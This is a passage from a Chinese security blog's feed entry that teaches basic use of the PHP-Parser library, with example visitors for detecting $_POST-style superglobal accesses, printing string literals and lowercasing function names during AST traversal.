)</code></pre><p>如果我想获取$_POST[‘a’],我就需要先判断节点类型是不是<code>Expr_ArrayDimFetch</code></p><p>然后判断<code>$node-&gt;var-&gt;name</code>是不是全局变量</p><p>最后提取<code>$node-&gt;var-&gt;name</code>和<code>$node-&gt;dim-&gt;value</code>然后将它们拼接</p><p>当我的全局变量为<code>$_POST[a]</code>时，dim部分的AST也会变化，我们还需要考虑这种情况。</p><p>但是我们可以使用</p><pre><code class="PHP">/*    用来识别全局变量;    如果要获取全局变量格式无需考虑value的节点类型    expr: Expr_ArrayDimFetch(            var: Expr_Variable(                name: _POST            )    )*/        if ($node instanceof Node\Expr\ArrayDimFetch &amp;&amp; $node-&gt;var instanceof Node\Expr\Variable &amp;&amp; (in_array($node-&gt;var-&gt;name ,GLOBAL_VAR)))        {            self::$globalname = $this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);        }</code></pre><p>其中</p><pre><code class="PHP">$this-&gt;prettyPrinter-&gt;prettyPrintExpr($node);</code></pre><p>就会返回该Expr节点的表达式，无论是<code>$_POST['a']</code>还是<code>$_POST[a]</code>都可以正常返回</p><p><a href="https://github.com/nikic/PHP-Parser/blob/master/doc/component/Pretty_printing.markdown">PHP-Parser/Pretty_printing.markdown at master · nikic/PHP-Parser (github.com)</a></p><h2 id="Node-traversation"><a href="#Node-traversation" class="headerlink" title="Node traversation"></a>Node traversation</h2><p>我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作</p><p>使用<code>PhpParser\NodeTraverser</code>我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出</p><pre><code class="PHP">&lt;?phpuse PhpParser\Error;use PhpParser\ParserFactory;use PhpParser\NodeTraverser;use PhpParser\NodeVisitorAbstract;use PhpParser\Node;require 'vendor/autoload.php';class MyVisitor extends NodeVisitorAbstract{    public function leaveNode(Node $node)    {        //判断如果是一个String_节点，就输出        if ($node instanceof Node\Scalar\String_)        {            echo $node -&gt; value,"\n";        }    }}$code = file_get_contents("./test.php");//实例化解释器$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$traverser = New NodeTraverser;//添加自己的Visitor$traverser-&gt;addVisitor(new MyVisitor);try {    //转化AST    $ast = $parser-&gt;parse($code);    //开始遍历    $stmts = $traverser-&gt;traverse($ast);} catch (Error $error) {    echo "Parse error: {$error-&gt;getMessage()}\n";    return;}?&gt;</code></pre><p>替换php脚本中函数以及类的成员方法函数名为小写</p><pre><code class="PHP">class MyVisitor extends NodeVisitorAbstract{    public function leaveNode(Node $node)    {        if( $node instanceof Node\Expr\FuncCall) {            $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]);        }elseif($node instanceof Node\Stmt\ClassMethod){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }elseif ($node instanceof Node\Stmt\Function_){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }elseif($node instanceof Node\Expr\MethodCall){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }    }}</code></pre><p>需要注意的是所有的<code>visitors</code>都必须实现<code>PhpParser\NodeVisitor</code>接口，该接口定义了如下4个方法：</p><pre><code class="PHP">public function beforeTraverse(array $nodes);public function enterNode(\PhpParser\Node $node);public function leaveNode(\PhpParser\Node $node);public function afterTraverse(array $nodes);</code></pre><ul><li><p><code>beforeTraverse</code>方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。</p></li><li><p><code>afterTraverse</code>方法与<code>beforeTraverse</code>方法类似，唯一的区别是它只在遍历之后调用一次。</p></li><li><p>在每个节点上都调用<code>enterNode</code>和<code>leaveNode</code>方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。</p></li><li><p>这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。</p></li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="http://j0k3r.top/2020/03/24/php-Deobfuscator/#0x01-php-parser">基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog</a></p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP-Parser&quot;&gt;&lt;a href=&quot;#PHP-Parser&quot; class=&quot;headerlink&quot; title=&quot;PHP-Parser&quot;&gt;&lt;/a&gt;PHP-Parser&lt;/h1&gt;&lt;p&gt;PHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="PHP" scheme="https://rainsec.cn/tags/PHP/"/>
    
  </entry>
  
</feed>
